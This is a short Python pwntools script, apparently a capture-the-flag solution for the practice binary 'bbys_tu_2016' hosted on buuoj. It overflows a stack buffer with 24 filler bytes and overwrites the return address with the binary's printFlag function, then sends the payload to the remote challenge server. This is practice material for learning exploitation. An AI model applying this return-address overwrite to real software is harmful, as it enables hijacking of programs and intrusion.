from pwn import *

def bbys_tu_2016(file_name = '/mnt/hgfs/CyberSecurity/PWN/buuoj/bbys_tu_2016'):
    print('bbys_tu_2016 start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 28208)
    target_elf = ELF(file_name)

    print_flag_addr = p32(target_elf.symbols['printFlag'])

    payload = b'a' * 24
    payload += print_flag_addr

    # This program is hungry. You should feed it.
    target.sendline(payload)
    # You should feed it.
    print(target.recvline())
    print(target.recvline())
    print(target.recvline())
    print('bbys_tu_2016 end')

if __name__ == '__main__':
    bbys_tu_2016()